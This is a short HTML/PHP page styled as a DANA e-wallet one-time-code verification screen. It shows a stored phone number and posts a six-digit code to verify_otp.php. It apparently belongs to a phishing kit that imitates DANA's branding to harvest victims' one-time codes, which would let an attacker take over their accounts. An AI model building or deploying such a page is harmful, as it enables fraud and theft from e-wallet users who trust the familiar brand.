<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi OTP - DANA</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <img src="assets/dana-logo.png" alt="DANA" width="120">
        <p>Kode verifikasi telah dikirim ke <?php session_start(); echo $_SESSION['phone']; ?></p>
        <form action="verify_otp.php" method="POST">
            <input type="text" name="otp" placeholder="Masukkan 6 digit kode" maxlength="6" required>
            <button type="submit">Verifikasi</button>
        </form>
    </div>
</body>
</html>
